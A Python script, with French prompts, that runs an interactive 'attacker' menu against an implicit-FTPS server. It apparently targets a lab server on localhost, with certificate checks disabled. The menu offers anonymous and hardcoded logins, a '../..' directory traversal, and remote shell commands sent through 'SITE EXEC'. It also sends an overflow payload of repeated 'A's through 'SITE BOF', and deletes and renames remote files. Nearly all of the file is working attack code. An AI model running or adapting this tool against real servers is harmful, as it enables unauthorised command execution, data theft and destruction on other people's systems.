#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Attacker Implicit-FTPS — Menu interactif

1) anonymous/""
2) attacker/secret
3) custom
4) NLST
5) RETR
6) STOR
7) CWD ../.. (traversal)
8) SITE EXEC /bin/bash
9) SITE BOF [payload]
10) RNFR/RNTO
11) DELE
12) MKD/RMD
13) Quitter
"""

import os, ssl, socket, argparse, uuid
from ftplib import FTP, error_perm
try:
    from colorama import init, Fore
except ImportError:
    import subprocess, sys
    subprocess.check_call([sys.executable, "-m", "pip", "install", "colorama"])
    from colorama import init, Fore
init(autoreset=True)

def make_ftps(host, port):
    raw = socket.create_connection((host, port), timeout=10)
    ctx = ssl._create_unverified_context()
    ss  = ctx.wrap_socket(raw, server_hostname=host)
    ftp = FTP()
    ftp.sock          = ss
    ftp.file          = ss.makefile('r', encoding='utf-8', newline='\r\n')
    ftp.af, ftp.passiveserver = ss.family, True
    banner = ftp.getresp().strip()
    print(Fore.YELLOW + "← Bannière :", banner)
    return ftp

def do_login(ftp, user, pwd):
    try:
        resp = ftp.login(user, pwd)
        print(Fore.GREEN + f"← LOGIN OK : {resp}")
        return True
    except error_perm as e:
        print(Fore.RED + f"× AUTH FAILED : {e}")
        return False

def do_nlst(ftp):
    try:
        files = ftp.nlst(".")
        print(Fore.CYAN + "← FILES:")
        for f in files:
            print("   •", f)
    except Exception as e:
        print(Fore.RED + "× NLST error:", e)

def do_retr(ftp):
    fn = input("Fichier à RETR > ").strip()
    dst = input("Local destination > ").strip() or fn
    with open(os.path.expanduser(dst),"wb") as f:
        ftp.retrbinary(f"RETR {fn}", f.write)
    print(Fore.GREEN + f"✓ {fn} → {dst}")

def do_stor(ftp):
    src = input("Local file to STOR > ").strip()
    src = os.path.expanduser(src)
    if not os.path.isfile(src):
        print(Fore.RED + "Fichier invalide."); return
    remote = input("Remote name > ").strip() or os.path.basename(src)
    with open(src,"rb") as f:
        ftp.storbinary(f"STOR {remote}", f)
    print(Fore.GREEN + f"✓ Uploaded {src} → /{remote}")

def do_cwd_traverse(ftp):
    resp = ftp.cwd("../..")
    print(Fore.GREEN + f"← CWD ../.. : {resp}")

def do_site_exec(ftp):
    cmd = input("Commande shell > ").strip()
    resp = ftp.sendcmd(f"SITE EXEC {cmd}")
    print(Fore.GREEN + "←", resp)

def do_site_bof(ftp):
    length = int(input("Taille payload > ").strip() or "1024")
    payload = "A" * length
    try:
        resp = ftp.sendcmd(f"SITE BOF {payload}")
        print(Fore.GREEN + "←", resp)
    except Exception as e:
        print(Fore.RED + "←", e)

def do_rnfr_rnto(ftp):
    old = input("RNFR file > ").strip()
    new = input("RNTO name > ").strip()
    resp1 = ftp.sendcmd(f"RNFR {old}")
    print(Fore.GREEN + "←", resp1)
    resp2 = ftp.sendcmd(f"RNTO {new}")
    print(Fore.GREEN + "←", resp2)

def do_dele(ftp):
    fn = input("DELE file > ").strip()
    resp = ftp.delete(fn)
    print(Fore.GREEN + "←", resp)

def do_mkd_rmd(ftp):
    d = input("MKD directory > ").strip()
    print(Fore.GREEN + "←", ftp.mkd(d))
    r = input("RMD directory > ").strip()
    print(Fore.GREEN + "←", ftp.rmd(r))

def main():
    p = argparse.ArgumentParser()
    p.add_argument("--host", default="127.0.0.1")
    p.add_argument("--port", default=2121, type=int)
    args = p.parse_args()

    ftp = None
    print(Fore.YELLOW + "=== Attacker Implicit-FTPS Menu ===")
    while True:
        print("""
1) anonymous/""
2) attacker/secret
3) custom
4) NLST
5) RETR
6) STOR
7) CWD ../..
8) SITE EXEC /bin/bash
9) SITE BOF payload
10) RNFR/RNTO
11) DELE
12) MKD/RMD
13) Quitter
""")
        cmd = input("Votre choix > ").strip()
        if cmd in ("1","2","3"):
            if ftp: ftp.close()
            ftp = make_ftps(args.host, args.port)
            if cmd == "1": ok = do_login(ftp,"anonymous","")
            elif cmd=="2": ok = do_login(ftp,"attacker","secret")
            else:
                u = input("User > ").strip()
                p = input("Pass > ").strip()
                ok = do_login(ftp,u,p)
            if not ok:
                ftp.close(); ftp = None
        elif cmd=="4" and ftp:     do_nlst(ftp)
        elif cmd=="5" and ftp:     do_retr(ftp)
        elif cmd=="6" and ftp:     do_stor(ftp)
        elif cmd=="7" and ftp:     do_cwd_traverse(ftp)
        elif cmd=="8" and ftp:     do_site_exec(ftp)
        elif cmd=="9" and ftp:     do_site_bof(ftp)
        elif cmd=="10" and ftp:    do_rnfr_rnto(ftp)
        elif cmd=="11" and ftp:    do_dele(ftp)
        elif cmd=="12" and ftp:    do_mkd_rmd(ftp)
        elif cmd=="13":
            if ftp: ftp.close()
            print("Bye!"); break
        else:
            print("→ Connectez-vous d’abord ou choix invalide.")

if __name__=="__main__":
    main()
